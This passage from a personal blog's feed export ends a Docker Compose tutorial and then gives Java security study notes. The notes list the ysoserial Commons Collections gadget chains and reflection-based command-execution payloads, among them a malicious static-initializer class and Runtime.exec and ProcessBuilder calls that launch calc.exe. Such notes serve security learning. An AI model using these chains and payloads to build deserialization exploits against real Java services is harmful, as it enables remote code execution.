<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二进制包方式安装的，删除二进制文件即可</span></span><br><span class="line">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>



<p>使用docker compose编排nginx+springboot项目</p>
<ol>
<li>创建docker-compose目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/docker-compose</span><br><span class="line">cd ~/docker-compose</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编写 docker-compose.yml 文件</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">   image: nginx</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">   links:</span><br><span class="line">    - app</span><br><span class="line">   volumes:</span><br><span class="line">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class="line">  app:</span><br><span class="line">    image: app</span><br><span class="line">    <span class="keyword">expose</span>:</span><br><span class="line">      - <span class="string">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建.&#x2F;nginx&#x2F;conf.d目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure>



<ol start="4">
<li>在.&#x2F;nginx&#x2F;conf.d目录下 编写itheima.conf文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://app:8080;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>在~&#x2F;docker-compose 目录下 使用docker-compose 启动容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>测试访问</li>
</ol>
<h3 id="7、私有镜像"><a href="#7、私有镜像" class="headerlink" title="7、私有镜像"></a>7、私有镜像</h3><p>略</p>
<h3 id="8、Docker容器虚拟化与传统虚拟机相比"><a href="#8、Docker容器虚拟化与传统虚拟机相比" class="headerlink" title="8、Docker容器虚拟化与传统虚拟机相比"></a>8、Docker容器虚拟化与传统虚拟机相比</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161119318.png" alt="image-20230301161119318"></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161129373.png" alt="image-20230301161129373"></p>
]]></content>
      <tags>
        <tag>容器</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全学习</title>
    <url>/2023/03/21/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><a href="https://github.com/phith0n/JavaThings">phith0n&#x2F;JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容 (github.com)</a></p>
<p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<p><a href="https://xz.aliyun.com/t/9409#toc-7">CC链 1-7 分析 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://huaweicloud.csdn.net/63a56185b878a54545945a4d.html">CTFSHOW web入门 java反序列化篇（更新中）_java_yu22x-DevPress官方社区 (csdn.net)</a></p>
<p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0">https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&amp;ctype=0</a></p>
<p><a href="https://www.anquanke.com/post/id/261724">URLDNS链&amp;CommonsCollections链详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://blog.csdn.net/qq_41854911/article/details/122159068">maven引入依赖包，import依赖包，编译运行maven项目_引入meven依赖_小熊coder的博客-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.anquanke.com/post/id/82934">JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>环境：</p>
<p>cc1：mu85（jdk1.8.1_111）<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>maven依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>sun中的是.class不是源码怎么办？</p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4 (openjdk.org)</a></p>
<p>zip下载下来复制其中的sun，然后到对应jdk的src解压复制即可。在porject settings  sdks sourcepath 加入刚刚的src，maven 可以直接download source</p>
<p>查找接口的实现类：</p>
<p>IDEA 风格 <strong>ctrl + alt +B</strong></p>
<p>查看类或接口的继承关系：<strong>ctrl + h</strong></p>
<span id="more"></span>

<h2 id="不同cc的利用链："><a href="#不同cc的利用链：" class="headerlink" title="不同cc的利用链："></a>不同cc的利用链：</h2><p>在ysoserial中cc1、cc3、cc5、cc6、cc7对应的commons-collections:3.1<br>cc2、cc4对应的commons-collections4:4.0</p>
<p>来自ysoserial</p>
<p>cc1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br><span class="line"></span><br><span class="line">Requires:</span><br><span class="line">	commons-collections</span><br></pre></td></tr></table></figure>

<ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>java &lt; 8u71（我是用的是8u66）</li>
</ul>
<p>cc2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p>
<p>cc3</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk7u21及以前</p>
<p>cc4</p>
<p><strong>测试环境</strong>：4.0，jdk7u21及以前</p>
<p>cc5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"></span><br><span class="line">	Requires:</span><br><span class="line">		commons-collections</span><br><span class="line"> */</span><br><span class="line">/*</span><br><span class="line">This only works in JDK 8u76 and WITHOUT a security manager</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.8</p>
<p>cc6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line">    by @matthias_kaiser</span><br><span class="line">*/</span><br><span class="line">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span><br><span class="line">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<p>cc7</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">    Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h2 id="Java的动态特性——反射"><a href="#Java的动态特性——反射" class="headerlink" title="Java的动态特性——反射"></a>Java的动态特性——反射</h2><p>参考：</p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态 特性。</p>
<p>“动态特性”：⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，称之为动态特性</p>
<p>下面是一段反射的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼏个在反射⾥极为重要的⽅法：</p>
<p> 获取类的⽅法： forName </p>
<p>实例化类对象的⽅法： newInstance </p>
<p>获取函数的⽅法： getMethod </p>
<p>执⾏函数的⽅法： invoke</p>
<p>forName 不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就 是 java.lang.Class 对象：</p>
<ol>
<li>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 </li>
<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 </li>
<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>
</ol>
<p>使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代 码）： 1.getClass().forName(“java.lang.Runtime”)</p>
<p>forName有两个函数重载：</p>
<ul>
<li><p>Class forName(String name) </p>
</li>
<li><p>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</p>
</li>
</ul>
<p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>

<p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 ClassLoader 。</p>
<p>ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。</p>
<p>下面是一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">Static initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Empty block initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br></pre></td></tr></table></figure>

<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数。</p>
<p>其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。</p>
<p>forName 中的 initialize&#x3D;true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p>
<p>假设我们有如下函数，其中函数的参数name可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"> String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"> <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line"> pc.waitFor();</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> <span class="comment">// do nothing</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是自己写的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    hello()&#123;</span><br><span class="line">        name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
<p>另外，我们经常在一些源码里看到，类名的部分包含 $ 符号，比如<em>fastjson</em>在 checkAutoType 时候就会 先将$ 替换成 . ：<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fa</a> stjson&#x2F;parser&#x2F;ParserConfig.java#L1038。 $ 的作用是查找内部类。</p>
<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。</p>
<p><a href="https://www.jianshu.com/p/b10d006a14fd">Java 反射内部类 - 简书 (jianshu.com)</a></p>
<p>下面是自己写的demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.test$hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">        hello()&#123;</span><br><span class="line">            name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是： </p>
<ol>
<li>你使用的类没有无参构造函数 </li>
<li>你使用的类构造函数是私有的</li>
</ol>
<p>最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>原因是 Runtime 类的构造方法是私有的。</p>
<p>类的私有原因设计到一种设计模式“单例模式”。</p>
<p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 建立连接的代码...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。</p>
<p>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里用到了 getMethod 和 invoke 方法。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要 传给他你需要获取的函数的参数类型列表。</p>
<p>Runtime.exec 方法有6个重载：</p>
<p>使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。</p>
<p>invoke 的作用是执行方法，它的第一个参数是： </p>
<ul>
<li><p>如果这个方法是一个普通方法，那么第一个参数是类对象</p>
</li>
<li><p>如果这个方法是一个静态方法，那么第一个参数是类</p>
</li>
</ul>
<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>
<p>将上述命令执行的Payload分解一下就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在有两个问题：</p>
<ul>
<li><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ </p>
</li>
<li><p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
</li>
</ul>
<p>下面在回答。</p>
<p><strong>第一个问题</strong>，我们需要用到一个新的反射方法 getConstructor 。</p>
<p> 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。</p>
<p> 获取到构造函数后，我们使用 newInstance 来执行。</p>
<p> 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><p>public ProcessBuilder(List command) </p>
</li>
<li><p>public ProcessBuilder(String… command)</p>
</li>
</ul>
<p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。</p>
<p> 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。</p>
<p>所以，我们仍需利用反射来完成这一步。</p>
<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是ProcessBuilder Object了。</p>
<p><strong>第二个问题</strong></p>
<p>getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p>
<ul>
<li>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li>
<li>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</li>
</ul>
<p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似。</p>
<p>过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p>
